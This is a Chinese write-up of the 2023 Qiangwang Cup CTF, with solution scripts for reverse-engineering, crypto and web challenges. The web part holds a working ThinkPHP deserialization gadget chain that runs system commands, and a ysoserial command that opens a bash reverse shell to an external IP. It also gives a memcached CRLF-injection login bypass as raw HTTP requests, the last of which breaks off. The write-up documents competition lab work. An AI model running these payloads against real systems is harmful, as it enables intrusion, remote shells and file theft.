<p class="img-center"><img alt="" height="532" src="https://images2.imgbox.com/e4/dd/CqeHgtfL_o.jpg" width="1200"></p> 
<p></p> 
<p>解密脚本</p> 
<pre>#include &lt;stdio.h&gt;</pre> 
<pre>#include &lt;stdint.h&gt;</pre> 
<pre></pre> 
<pre>//加密函数</pre> 
<pre>void encrypt(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4])</pre> 
<pre>{<!-- --></pre> 
<pre>    unsigned int i;</pre> 
<pre>    uint32_t v0 = v[0], v1 = v[1], sum = 0x90508D47, delta = 0x77BF7F99;</pre> 
<pre>    for (int j = 0; j &lt; 4; j++)</pre> 
<pre>    {<!-- --></pre> 
<pre>        for (i = 0; i &lt; num_rounds; i++)</pre> 
<pre>        {<!-- --></pre> 
<pre>            v0 += (((v1 &gt;&gt; 4) ^ (v1 &lt;&lt; 5)) + v1) ^ (sum + key[sum &amp; 3]) ^ sum;</pre> 
<pre>            v1 += (((v0 &gt;&gt; 4) ^ (v0 &lt;&lt; 5)) + v0) ^ (sum + key[(sum &gt;&gt; 11) &amp; 3]);</pre> 
<pre>            sum -= delta;</pre> 
<pre>        }</pre> 
<pre>    }</pre> 
<pre>    v[0] = v0;</pre> 
<pre>    v[1] = v1;</pre> 
<pre>    printf("sum==0x%x\n", sum);</pre> 
<pre>}</pre> 
<pre></pre> 
<pre>//解密函数</pre> 
<pre>void decrypt(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4])</pre> 
<pre>{<!-- --></pre> 
<pre>    unsigned int i;</pre> 
<pre>    uint32_t v0 = v[0], v1 = v[1], delta = 0x77BF7F99, sum = 0xd192c263;</pre> 
<pre>    for (int j = 0; j &lt; 4; j++)</pre> 
<pre>    {<!-- --></pre> 
<pre>        for (i = 0; i &lt; num_rounds; i++)</pre> 
<pre>        {<!-- --></pre> 
<pre>            sum += delta;</pre> 
<pre>            v1 -= (((v0 &gt;&gt; 4) ^ (v0 &lt;&lt; 5)) + v0) ^ (sum + key[(sum &gt;&gt; 11) &amp; 3]);</pre> 
<pre>            v0 -= (((v1 &gt;&gt; 4) ^ (v1 &lt;&lt; 5)) + v1) ^ (sum + key[sum &amp; 3]) ^ sum;</pre> 
<pre>        }</pre> 
<pre>    }</pre> 
<pre>    v[0] = v0;</pre> 
<pre>    v[1] = v1;</pre> 
<pre>    printf("sum==0x%x\n", sum);</pre> 
<pre>}</pre> 
<pre></pre> 
<pre>//打印数据 hex_or_chr: 1-hex 0-chr</pre> 
<pre>void dump_data(uint32_t *v, int n, bool hex_or_chr)</pre> 
<pre>{<!-- --></pre> 
<pre>    if (hex_or_chr)</pre> 
<pre>    {<!-- --></pre> 
<pre>        for (int i = 0; i &lt; n; i++)</pre> 
<pre>        {<!-- --></pre> 
<pre>            printf("0x%x,", v[i]);</pre> 
<pre>        }</pre> 
<pre>    }</pre> 
<pre>    else</pre> 
<pre>    {<!-- --></pre> 
<pre>        for (int i = 0; i &lt; n; i++)</pre> 
<pre>        {<!-- --></pre> 
<pre>            for (int j = 0; j &lt; sizeof(uint32_t) / sizeof(uint8_t); j++)</pre> 
<pre>            {<!-- --></pre> 
<pre>                printf("%c", (v[i] &gt;&gt; (j * 8)) &amp; 0xFF);</pre> 
<pre>            }</pre> 
<pre>        }</pre> 
<pre>    }</pre> 
<pre>    printf("\n");</pre> 
<pre>    return;</pre> 
<pre>}</pre> 
<pre></pre> 
<pre>int main()</pre> 
<pre>{<!-- --></pre> 
<pre>    // v为要加解密的数据</pre> 
<pre>    uint32_t v[] = {0x9523f2e0, 0x8ed8c293, 0x8668c393, 0xddf250bc, 0x510e4499, 0x8c60bd44, 0x34dcabf2, 0xc10fd260};</pre> 
<pre>    // k为加解密密钥，4个32位无符号整数，密钥长度为128位</pre> 
<pre>    uint32_t k[4] = {0x62, 0x6F, 0x6D, 0x62};</pre> 
<pre>    // num_rounds，建议取值为32</pre> 
<pre>    unsigned int r = 33;</pre> 
<pre></pre> 
<pre>    int n = sizeof(v) / sizeof(uint32_t);</pre> 
<pre>    /*</pre> 
<pre>    printf("加密前明文数据：");</pre> 
<pre>    dump_data(v, n, 1);</pre> 
<pre></pre> 
<pre>    for (int i = 0; i &lt; n / 2; i++)</pre> 
<pre>    {<!-- --></pre> 
<pre>        encrypt(r, &amp;v[i * 2], k);</pre> 
<pre>    }</pre> 
<pre>    */</pre> 
<pre>    printf("加密后密文数据：");</pre> 
<pre>    dump_data(v, n, 1);</pre> 
<pre></pre> 
<pre>    for (int i = 0; i &lt; n / 2; i++)</pre> 
<pre>    {<!-- --></pre> 
<pre>        decrypt(r, &amp;v[i * 2], k);</pre> 
<pre>    }</pre> 
<pre></pre> 
<pre>    printf("解密后明文数据：");</pre> 
<pre>    dump_data(v, n, 1);</pre> 
<pre></pre> 
<pre>    printf("解密后明文字符：");</pre> 
<pre>    dump_data(v, n, 0);</pre> 
<pre></pre> 
<pre>    return 0;</pre> 
<pre>}</pre> 
<pre></pre> 
<pre>// W31com3_2_Th3_QwbS7_4nd_H4v3_Fun</pre> 
<h5><strong>ezre</strong></h5> 
<p>变表base64编解码交替</p> 
<p></p> 
<p class="img-center"><a href="https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/0-1702891892.png" rel="nofollow"><img alt="2023 强网杯 writeup by Arr3stY0u" height="925" src="https://images2.imgbox.com/d0/51/rUZqvslE_o.png" width="820"></a></p> 
<p>有个循环异或</p> 
<p></p> 
<p class="img-center"><a href="https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/2-1702891893.png" rel="nofollow"><img alt="2023 强网杯 writeup by Arr3stY0u" height="752" src="https://images2.imgbox.com/ea/42/OH2i26K2_o.png" width="647"></a></p> 
<p>先逆循环异或</p> 
<pre>enc = [0x3A, 0x2C, 0x4B, 0x51, 0x68, 0x46, 0x59, 0x63, 0x24, 0x04,</pre> 
<pre>       0x5E, 0x5F, 0x00, 0x0C, 0x2B, 0x03, 0x29, 0x5C, 0x74, 0x70,</pre> 
<pre>       0x6A, 0x62, 0x7F, 0x3D, 0x2C, 0x4E, 0x6F, 0x13, 0x06, 0x0D,</pre> 
<pre>       0x06, 0x0C, 0x4D, 0x56, 0x0F, 0x28, 0x4D, 0x51, 0x76, 0x70,</pre> 
<pre>       0x2B, 0x05, 0x51, 0x68, 0x48, 0x55, 0x24, 0x19]</pre> 
<pre>tbs = ["l+USN4J5Rfj0TaVOcnzXiPGZIBpoAExuQtHyKD692hwmqe7/Mgk8v1sdCW3bYFLr",</pre> 
<pre>       "FGseVD3ibtHWR1czhLnUfJK6SEZ2OyPAIpQoqgY0w49u+7rad5CxljMXvNTBkm/8",</pre> 
<pre>       "Hc0xwuZmy3DpQnSgj2LhUtrlVvNYks+BX/MOoETaKqR4eb9WF8ICGzf6id1P75JA",</pre> 
<pre>       "pnHQwlAveo4DhGg1jE3SsIqJ2mrzxCiNb+Mf0YVd5L8c97/WkOTtuKFZyRBUPX6a",</pre> 
<pre>       "plxXOZtaiUneJIhk7qSYEjD1Km94o0FTu52VQgNL3vCBH8zsA/b+dycGPRMwWfr6"]</pre> 
<pre>aaa = [ord(c)</pre> 
<pre>       for c in "plxXOZtaiUneJIhk7qSYEjD1Km94o0FTu52VQgNL3vCBH8zsA/b+dycGPRMwWfr6"]</pre> 
<pre>for i in range(len(aaa)):</pre> 
<pre>    aaa[i] ^= 0x27</pre> 
<pre>v5 = aaa[6:6+0x15]</pre> 
<pre>v7 = 2023</pre> 
<pre>v6 = 0</pre> 
<pre>v8 = 48</pre> 
<pre>xor = []</pre> 
<pre>while v6 &lt; v8 - 1:</pre> 
<pre>    if v6 % 3 == 1:</pre> 
<pre>        v7 = (v7 + 5) % 20</pre> 
<pre>        v3 = v5[v7 + 1]</pre> 
<pre>    elif v6 % 3 == 2:</pre> 
<pre>        v7 = (v7 + 7) % 19</pre> 
<pre>        v3 = v5[v7 + 2]</pre> 
<pre>    else:</pre> 
<pre>        v7 = (v7 + 3) % 17</pre> 
<pre>        v3 = v5[v7 + 3]</pre> 
<pre>    v6 += 1</pre> 
<pre>    xor.append(v3)</pre> 
<pre>for i in range(len(enc)-1, -1, -1):</pre> 
<pre>    enc[i] ^= enc[i-1]</pre> 
<pre>    if i &lt;= len(enc)-2:</pre> 
<pre>        enc[i] ^= xor[i]</pre> 
<pre>print(bytes(enc))</pre> 
<pre># jZqSWcUtWBLlOriEfcajWBSRstLlkEfFWR7j/R7dMCDGnp==</pre> 
<p>再逆变表base64编解码再补全</p> 
<p></p> 
<p class="img-center"><a href="https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/7-1702891893.png" rel="nofollow"><img alt="2023 强网杯 writeup by Arr3stY0u" height="637" src="https://images2.imgbox.com/50/1e/NzjtvyAD_o.png" width="1080"></a></p> 
<pre>flag{3ea590ccwxehg715264fzxnzepqz}</pre> 
<h5>石头剪刀布</h5> 
<p>因为模型的预测是只跟输入的sequence有关，所以可以根据当前情况的最优解输入进去来得到模型的下一步输出，这样就可以得到我们下一步的最优解。一直循环下去，就可以得到全部的最优解。</p> 
<p>由于前面5次大模型是随机输出的，因此我们可以考虑从第6次开始求最优解。最坏情况下，前5次全输，需要87步即可达到260分，即第92轮时，因此可以通过本题。</p> 
<pre>from pwn import remote</pre> 
<pre></pre> 
<pre>ip = '&lt;ip&gt;'</pre> 
<pre>port = '&lt;port&gt;'</pre> 
<pre></pre> 
<pre>class GetStatus:</pre> 
<pre>    def __init__(self, _ip=ip, _port=port) -&gt; None:</pre> 
<pre>        self.r = remote(_ip, _port)</pre> 
<pre>        self.score = 0</pre> 
<pre></pre> 
<pre>    def getdiff(self, out):</pre> 
<pre>        self.r.sendlineafter('请出拳'.encode(), str(out).encode())</pre> 
<pre>        self.r.recvuntil('分数：'.encode())</pre> 
<pre>        newscore = int(self.r.recvline().decode()) </pre> 
<pre>        diff = newscore - self.score</pre> 
<pre>        self.score = newscore</pre> 
<pre>        return diff</pre> 
<pre></pre> 
<pre>    def test_list(self, lis):</pre> 
<pre>        for out in lis:</pre> 
<pre>            diff = self.getdiff(out)</pre> 
<pre>            if self.score &gt;= 260:</pre> 
<pre>                return 'win'</pre> 
<pre>        return diff</pre> 
<pre></pre> 
<pre>current_best = [0] * 5</pre> 
<pre>diff2out = {<!-- --></pre> 
<pre>    3: 0,</pre> 
<pre>    1: 2,</pre> 
<pre>    0: 1</pre> 
<pre>}</pre> 
<pre>while len(current_best) &lt;= 100:</pre> 
<pre>    current_best.append(0)</pre> 
<pre>    c = GetStatus()</pre> 
<pre>    diff = c.test_list(current_best)</pre> 
<pre>    if c.score &gt;= 260:</pre> 
<pre>        c.r.interactive()</pre> 
<pre>        break</pre> 
<pre>    c.r.close()</pre> 
<pre>    current_best[-1] = diff2out[diff]</pre> 
<pre>    print(f'Round {len(current_best)}: {current_best}')</pre> 
<p>或者</p> 
<p>按照如下顺序即可获胜</p> 
<blockquote> 
 <p>0000011220120220110111222010022012110021012012202100112022100112110020110220210201</p> 
</blockquote> 
<p></p> 
<p class="img-center"><img alt="" height="809" src="https://images2.imgbox.com/99/2c/67IPvmSd_o.png" width="925"></p> 
<h4>CRYPTO</h4> 
<h5>not only rsa</h5> 
<p>n是一个质数5次方，可以求解1和C的根后进行组合出所有C的根，sage脚本如下：</p> 
<pre>from Crypto.Util.number import  long_to_bytes</pre> 
<pre>p=91027438112295439314606669837102361953591324472804851543344131406676387779969</pre> 
<pre>e = 641747</pre> 
<pre>c = 730024611795626517480532940587152891926416120514706825368440230330259913837764632826884065065554839415540061752397144140563698277864414584568812699048873820551131185796851863064509294123861487954267708318027370912496252338232193619491860340395824180108335802813022066531232025997349683725357024257420090981323217296019482516072036780365510855555146547481407283231721904830868033930943</pre> 
<pre>n=p^5</pre> 
<pre>K=Zmod(p^5)</pre> 
<pre>a=K(c).nth_root(e)</pre> 
<pre>b=K(1).nth_root(e)</pre> 
<pre>a=int(a)</pre> 
<pre>b=int(b)</pre> 
<pre>print(b,a)</pre> 
<pre>from tqdm import tqdm</pre> 
<pre>for i in tqdm(range(e)):</pre> 
<pre>  a=(a*b)%n</pre> 
<pre>  m=long_to_bytes(int(a))</pre> 
<pre>  if b"flag" in m:</pre> 
<pre>    print(m)</pre> 
<pre>    break</pre> 
<p>#flag{c19c3ec0-d489-4bbb-83fc-bc0419a6822a}</p> 
<p></p> 
<h5>discrete_log</h5> 
<p>阅读代码，题目给的假flag长度较小，猜测实际flag长度也较小，据此采用中间相遇思想进行破解</p> 
<pre>import itertoolsfrom gmpy2 import *from Crypto.Util.Padding import *from Crypto.Util.number import *from tqdm import tqdmp = 173383907346370188246634353442514171630882212643019826706575120637048836061602034776136960080336351252616860522273644431927909101923807914940397420063587913080793842100264484222211278105783220210128152062330954876427406484701993115395306434064667136148361558851998019806319799444970703714594938822660931343299g = 5c = 105956730578629949992232286714779776923846577007389446302378719229216496867835280661431342821159505656015790792811649783966417989318584221840008436316642333656736724414761508478750342102083967959048112859470526771487533503436337125728018422740023680376681927932966058904269005466550073181194896860353202252854q = 86691953673185094123317176721257085815441106321509913353287560318524418030801017388068480040168175626308430261136822215963954550961903957470198710031793956540396921050132242111105639052891610105064076031165477438213703242350996557697653217032333568074180779425999009903159899722485351857297469411330465671649flag_len=12fake_flag_pad='flag{'.encode() +'x00'.encode()*flag_len+'}'.encode()flag_pattern = (pad(fake_flag_pad, 128))#print(flag_pattern)flag_pattern=bytes_to_long(flag_pattern)pattern=1&lt;&lt;888#print(bin(pattern))cc = c * inverse(pow(g,flag_pattern,p),p)%pcc = pow(cc, inverse(pattern, q), p)print(cc)table = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f']dic = dict()gtemp= pow(g, 2**48, p)for half_flag1 in tqdm(itertools.product(table, repeat=6)):    half_flag1 = bytes_to_long(''.join(half_flag1).encode())    temp = cc * powmod(gtemp, -(half_flag1), p) % p    dic[temp] = half_flag1for half_flag2 in tqdm(itertools.product(table, repeat=6)):    half_flag2 = bytes_to_long(''.join(half_flag2).encode())    temp = powmod(g, half_flag2, p)    if temp in dic:        print(long_to_bytes(dic[temp]) + long_to_bytes(half_flag2))</pre> 
<h4>WEB</h4> 
<h5>thinkshop</h5> 
<p>附件在本地起docker可以得到源码，审计发现admin路由</p> 
<p>后台路径 /public/index.php/index/admin/login.html</p> 
<p>1/123456登陆后台</p> 
<p></p> 
<p></p> 
<p class="img-center"><img alt="" height="482" src="https://images2.imgbox.com/19/ff/r6IQdTbT_o.jpg" width="1200"></p> 
<p></p> 
<p>审计发现在保存操作调用save-&gt;updatedata</p> 
<p></p> 
<p></p> 
<p class="img-center"><img alt="" height="455" src="https://images2.imgbox.com/27/72/3muNgmgv_o.jpg" width="1200"></p> 
<p></p> 
<p>在updatedata存在SQL注入，$key相当于是$data中的一个键值。</p> 
<p></p> 
<p></p> 
<p class="img-center"><img alt="" height="452" src="https://images2.imgbox.com/33/40/Rvcf2lKI_o.jpg" width="981"></p> 
<p></p> 
<p>在保存商品时会调用saveGoods数据进行序列化之后保存到数据库</p> 
<p></p> 
<p></p> 
<p class="img-center"><img alt="" height="292" src="https://images2.imgbox.com/44/e2/ipUksKNE_o.jpg" width="1050"></p> 
<p></p> 
<p>在编辑页面可以看到数据抽取时会进行反序列化操作</p> 
<p></p> 
<p></p> 
<p class="img-center"><img alt="" height="290" src="https://images2.imgbox.com/6d/7c/gQVYmCAx_o.jpg" width="1200"></p> 
<p></p> 
<p>利用SQL注入修改data数据的值，本题data是数组，且会插入数据库，最终的payload需要改一下让前后闭合，且TP5，在网上找一个链子的EXP改一下</p> 
<p>https://www.freebuf.com/vuls/317886.html</p> 
<pre>&lt;?php</pre> 
<pre>namespace think\process\pipes{<!-- --></pre> 
<pre>    use think\model\Pivot;</pre> 
<pre>    ini_set('display_errors',1);</pre> 
<pre>    class Windows{<!-- --></pre> 
<pre>        private $files = [];</pre> 
<pre>        public function __construct($function,$parameter)</pre> 
<pre>{<!-- --></pre> 
<pre>            $this-&gt;files = [new Pivot($function,$parameter)];</pre> 
<pre>        }</pre> 
<pre>    }</pre> 
<pre>    $aaa = new Windows('system','nl /f*');</pre> 
<pre>    echo base64_encode(serialize(array($aaa)));</pre> 
<pre>}</pre> 
<pre>namespace think{<!-- --></pre> 
<pre>    abstract class Model</pre> 
<pre>    {}</pre> 
<pre>}</pre> 
<pre>namespace think\model{<!-- --></pre> 
<pre>    use think\Model;</pre> 
<pre>    use think\console\Output;</pre> 
<pre>    class Pivot extends Model</pre> 
<pre>{<!-- --></pre> 
<pre>        protected $append = [];</pre> 
<pre>        protected $error;</pre> 
<pre>        public $parent;</pre> 
<pre>        public function __construct($function,$parameter)</pre> 
<pre>{<!-- --></pre> 
<pre>            $this-&gt;append['jelly'] = 'getError';</pre> 
<pre>            $this-&gt;error = new relation\BelongsTo($function,$parameter);</pre> 
<pre>            $this-&gt;parent = new Output($function,$parameter);</pre> 
<pre>        }</pre> 
<pre>    }</pre> 
<pre>    abstract class Relation</pre> 
<pre>{}</pre> 
<pre>}</pre> 
<pre>namespace think\model\relation{<!-- --></pre> 
<pre>    use think\db\Query;</pre> 
<pre>    use think\model\Relation;</pre> 
<pre>    abstract class OneToOne extends Relation</pre> 
<pre>{}</pre> 
<pre>    class BelongsTo extends OneToOne</pre> 
<pre>{<!-- --></pre> 
<pre>        protected $selfRelation;</pre> 
<pre>        protected $query;</pre> 
<pre>        protected $bindAttr = [];</pre> 
<pre>        public function __construct($function,$parameter)</pre> 
<pre>{<!-- --></pre> 
<pre>            $this-&gt;selfRelation = false;</pre> 
<pre>            $this-&gt;query = new Query($function,$parameter);</pre> 
<pre>            $this-&gt;bindAttr = [''];</pre> 
<pre>        }</pre> 
<pre>    }</pre> 
<pre>}</pre> 
<pre>namespace think\db{<!-- --></pre> 
<pre>    use think\console\Output;</pre> 
<pre>    class Query</pre> 
<pre>{<!-- --></pre> 
<pre>        protected $model;</pre> 
<pre>        public function __construct($function,$parameter)</pre> 
<pre>{<!-- --></pre> 
<pre>            $this-&gt;model = new Output($function,$parameter);</pre> 
<pre>        }</pre> 
<pre>    }</pre> 
<pre>}</pre> 
<pre>namespace think\console{<!-- --></pre> 
<pre>    use think\session\driver\Memcache;</pre> 
<pre>    class Output</pre> 
<pre>{<!-- --></pre> 
<pre>        protected $styles = [];</pre> 
<pre>        private $handle;</pre> 
<pre>        public function __construct($function,$parameter)</pre> 
<pre>{<!-- --></pre> 
<pre>            $this-&gt;styles = ['getAttr'];</pre> 
<pre>            $this-&gt;handle = new Memcache($function,$parameter);</pre> 
<pre>        }</pre> 
<pre>    }</pre> 
<pre>}</pre> 
<pre>namespace think\session\driver{<!-- --></pre> 
<pre>    use think\cache\driver\Memcached;</pre> 
<pre>    class Memcache</pre> 
<pre>{<!-- --></pre> 
<pre>        protected $handler = null;</pre> 
<pre>        protected $config  = [</pre> 
<pre>            'expire'       =&gt; '',</pre> 
<pre>            'session_name' =&gt; '',</pre> 
<pre>        ];</pre> 
<pre>        public function __construct($function,$parameter)</pre> 
<pre>{<!-- --></pre> 
<pre>            $this-&gt;handler = new Memcached($function,$parameter);</pre> 
<pre>        }</pre> 
<pre>    }</pre> 
<pre>}</pre> 
<pre>namespace think\cache\driver{<!-- --></pre> 
<pre>    use think\Request;</pre> 
<pre>    class Memcached</pre> 
<pre>{<!-- --></pre> 
<pre>        protected $handler;</pre> 
<pre>        protected $options = [];</pre> 
<pre>        protected $tag;</pre> 
<pre>        public function __construct($function,$parameter)</pre> 
<pre>{<!-- --></pre> 
<pre>            // pop链中需要prefix存在，否则报错</pre> 
<pre>            $this-&gt;options = ['prefix'   =&gt; 'jelly/'];</pre> 
<pre>            $this-&gt;tag = true;</pre> 
<pre>            $this-&gt;handler = new Request($function,$parameter);</pre> 
<pre>        }</pre> 
<pre>    }</pre> 
<pre>}</pre> 
<pre>namespace think{<!-- --></pre> 
<pre>    class Request</pre> 
<pre>    {<!-- --></pre> 
<pre>        protected $get     = [];</pre> 
<pre>        protected $filter;</pre> 
<pre>        public function __construct($function,$parameter)</pre> 
<pre>{<!-- --></pre> 
<pre>            $this-&gt;filter = $function;</pre> 
<pre>            $this-&gt;get = ["jelly"=&gt;$parameter];</pre> 
<pre>        }</pre> 
<pre>    }</pre> 
<pre>}</pre> 
<pre>//YToxOntpOjA7TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mzp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo1OiJqZWxseSI7czo4OiJnZXRFcnJvciI7fXM6ODoiACoAZXJyb3IiO086MzA6InRoaW5rXG1vZGVsXHJlbGF0aW9uXEJlbG9uZ3NUbyI6Mzp7czoxNToiACoAc2VsZlJlbGF0aW9uIjtiOjA7czo4OiIAKgBxdWVyeSI7TzoxNDoidGhpbmtcZGJcUXVlcnkiOjE6e3M6ODoiACoAbW9kZWwiO086MjA6InRoaW5rXGNvbnNvbGVcT3V0cHV0IjoyOntzOjk6IgAqAHN0eWxlcyI7YToxOntpOjA7czo3OiJnZXRBdHRyIjt9czoyODoiAHRoaW5rXGNvbnNvbGVcT3V0cHV0AGhhbmRsZSI7TzoyOToidGhpbmtcc2Vzc2lvblxkcml2ZXJcTWVtY2FjaGUiOjI6e3M6MTA6IgAqAGhhbmRsZXIiO086Mjg6InRoaW5rXGNhY2hlXGRyaXZlclxNZW1jYWNoZWQiOjM6e3M6MTA6IgAqAGhhbmRsZXIiO086MTM6InRoaW5rXFJlcXVlc3QiOjI6e3M6NjoiACoAZ2V0IjthOjE6e3M6NToiamVsbHkiO3M6NjoibmwgL2YqIjt9czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjt9czoxMDoiACoAb3B0aW9ucyI7YToxOntzOjY6InByZWZpeCI7czo2OiJqZWxseS8iO31zOjY6IgAqAHRhZyI7YjoxO31zOjk6IgAqAGNvbmZpZyI7YToyOntzOjY6ImV4cGlyZSI7czowOiIiO3M6MTI6InNlc3Npb25fbmFtZSI7czowOiIiO319fX1zOjExOiIAKgBiaW5kQXR0ciI7YToxOntpOjA7czowOiIiO319czo2OiJwYXJlbnQiO086MjA6InRoaW5rXGNvbnNvbGVcT3V0cHV0IjoyOntzOjk6IgAqAHN0eWxlcyI7YToxOntpOjA7czo3OiJnZXRBdHRyIjt9czoyODoiAHRoaW5rXGNvbnNvbGVcT3V0cHV0AGhhbmRsZSI7TzoyOToidGhpbmtcc2Vzc2lvblxkcml2ZXJcTWVtY2FjaGUiOjI6e3M6MTA6IgAqAGhhbmRsZXIiO086Mjg6InRoaW5rXGNhY2hlXGRyaXZlclxNZW1jYWNoZWQiOjM6e3M6MTA6IgAqAGhhbmRsZXIiO086MTM6InRoaW5rXFJlcXVlc3QiOjI6e3M6NjoiACoAZ2V0IjthOjE6e3M6NToiamVsbHkiO3M6NjoibmwgL2YqIjt9czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjt9czoxMDoiACoAb3B0aW9ucyI7YToxOntzOjY6InByZWZpeCI7czo2OiJqZWxseS8iO31zOjY6IgAqAHRhZyI7YjoxO31zOjk6IgAqAGNvbmZpZyI7YToyOntzOjY6ImV4cGlyZSI7czowOiIiO3M6MTI6InNlc3Npb25fbmFtZSI7czowOiIiO319fX19fX0</pre> 
<p>在编辑页面修改抓包</p> 
<p></p> 
<p></p> 
<p class="img-center"><img alt="" height="586" src="https://images2.imgbox.com/8f/ea/Ff8IiirA_o.jpg" width="1200"></p> 
<p></p> 
<p>放包</p> 
<p></p> 
<p class="img-center"><a href="https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/7-1702891867.png" rel="nofollow"><img alt="2023 强网杯 writeup by Arr3stY0u" height="762" src="https://images2.imgbox.com/e4/72/J7pVHX3M_o.png" width="1080"></a></p> 
<p>再次访问该商品得到flag</p> 
<p></p> 
<p></p> 
<p class="img-center"><img alt="" height="431" src="https://images2.imgbox.com/81/ae/hrUXsGgQ_o.jpg" width="1200"></p> 
<p></p> 
<pre>flag{c7c7e293-d532-496b-b414-c28bb3fe9aa7}</pre> 
<h5>happygame</h5> 
<p>使用grpcui工具</p> 
<pre>grpcui -plaintext ip:port</pre> 
<p>打开以后可以发现一个序列化参数。</p> 
<p></p> 
<p></p> 
<p class="img-center"><img alt="" height="636" src="https://images2.imgbox.com/e0/19/wSAR5QxZ_o.jpg" width="1099"></p> 
<p></p> 
<p>猜测后端是java组件，这里经过测试，发现CC5可以攻击，所以用ysoserial生成payload，因为exec会把管道符当做参数，所以需要先编码</p> 
<pre>java -jar ysoserial-main-923a2bda4e-1.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny43Ni4xNzguODkvOTAwMSAwPiYx}|{base64,-d}|{bash,-i}" | base64</pre> 
<p>发送该数据，即可成功反弹shell</p> 
<p></p> 
<p></p> 
<p class="img-center"><img alt="" height="230" src="https://images2.imgbox.com/8e/f4/cYSr7DNN_o.jpg" width="949"></p> 
<p></p> 
<h4>thinkshopping</h4> 
<p>第二天又上了thinkshopping这一题，和前一题主要的区别是goods_edit.html中的反序列化入口被删了</p> 
<p class="img-center"><img alt="" height="177" src="https://images2.imgbox.com/be/f1/9DLzzV9S_o.jpg" width="829"></p> 
<p>还有admin表中的内容被清空了，没有1、admin、e10adc3949ba59abbe56e057f20f883e这条数据了</p> 
<p>更重要的是，secure_file_priv的值为空了</p> 
<p class="img-center"><img alt="" height="274" src="https://images2.imgbox.com/63/17/9pwLg6pr_o.png" width="821"></p> 
<p>而前一题还是有值的</p> 
<p></p> 
<p class="img-center"><img alt="" height="271" src="https://images2.imgbox.com/5d/15/mlKhJ6uf_o.png" width="820"></p> 
<p>当然，前一题的SQL注入点依然存在，不过依然需要鉴权进入后台，这意味着，只需要我们能进入后台，就能通过load_file的方式读取flag。</p> 
<p>那么，如何进入到后台呢？前面提到，容器在启动的时候使用了memcached，但是在前一题中并没有用到</p> 
<p class="img-center"><img alt="" height="187" src="https://images2.imgbox.com/98/4e/01xkx1Qm_o.jpg" width="830"></p> 
<p>并且启动了memcached后，ThinkPHP中也配置了cache使用memcached做缓存</p> 
<p class="img-center"><img alt="" height="465" src="https://images2.imgbox.com/d1/e0/7stOsB88_o.jpg" width="804"></p> 
<p>而在登录时，使用了cache先获取缓存</p> 
<p class="img-center"><img alt="" height="280" src="https://images2.imgbox.com/4f/16/Np7e6dKH_o.jpg" width="727"></p> 
<p>跟进一下find逻辑，由于出题人配置了cache，所以会将数据缓存到memcached中，这里的缓存的key格式为：think:shop.admin|username</p> 
<p class="img-center"><img alt="" height="299" src="https://images2.imgbox.com/30/fa/XEoaTD7k_o.jpg" width="781"></p> 
<p>那么如何控制缓存的值呢？memcached存在CRLF注入漏洞，具体可参考下方文章：</p> 
<p> https://www.freebuf.com/vuls/328384.html</p> 
<p>简单来说，就是能set任意的值，例如下方的payload，就能注入一个snowwolf的键，且值为wolf，4代表数据长度</p> 
<p>TOKEN%00%0D%0Aset%20snowwolf%200%20500%204%0D%0Awolf</p> 
<pre>等价于
set snowwolf 0 500 4
wolf</pre> 
<pre>那么我们需要注入一个怎么样的数据呢？我们可以看一下存储之后的数据是长什么样的，将下面的内容添加到路由，然后访问执行</pre> 
<pre> public function test(){
    $result = Db::query("select * from admin where id=1");
    var_dump($result);
    $a = "think:shop.admin|admin";
    Cache::set($a, $result, 3600);
}</pre> 
<p>查看memcached中的值，长得像个序列化字符串</p> 
<p>telnet 127.0.0.1 11211</p> 
<pre>get think:shop.admin|admin
a:1:{i:0;a:3:{s:2:"id";i:1;s:8:"username";s:5:"admin";s:8:"password";s:32:"21232f297a57a5a743894a0e4a801fc3";}}</pre> 
<p></p> 
<p class="img-center"><img alt="" height="122" src="https://images2.imgbox.com/d3/79/0xuoVs8Q_o.jpg" width="821"></p> 
<p>这里有个坑点，就是memcached本身是没有数据类型的，只有key-value的概念，存放的都是字符串，但是PHP编程语言给它给予了数据类型的概念（当flags为0为字符串，当flags4为数组等等），我们看一下memcached的set命令格式：</p> 
<p>上图中的红色箭头所指向的4，就是下方的flags位置，也就是说，在PHP中，flags为4的缓存数据，被当做数组使用</p> 
<p>set key flags exptime bytes [noreply] </p> 
<pre>value </pre> 
<p>所以我们在构造CRLF注入的命令时，需要注意在set时，把flags设置为4</p> 
<pre>POST /public/index.php/index/admin/do_login.html HTTP/1.1
Host: eci-2ze7q6gtt4a3a07rywcf.cloudeci1.ichunqiu.com
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=korn6f9clt7oere36ke7pj7m70

username=admin%00%0D%0Aset%20think%3Ashop.admin%7Cadmin%204%20500%20101%0D%0Aa%3A3%3A%7Bs%3A2%3A%22id%22%3Bi%3A1%3Bs%3A8%3A%22username%22%3Bs%3A5%3A%22admin%22%3Bs%3A8%3A%22password%22%3Bs%3A32%3A%2221232f297a57a5a743894a0e4a801fc3%22%3B%7D&amp;password=admin</pre> 
<p>再用admin、admin去登录即可，登录到后台之后，再带上session去load_file读flag即可</p> 
<pre>POST /public/index.php/index/admin/do_edit.html HTTP/1.1
Host: eci-2ze7q6gtt4a3a07rywcf.cloudeci1.ichunqiu.com
Content-Length: 183
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=korn6f9clt7oere36ke7pj7m70

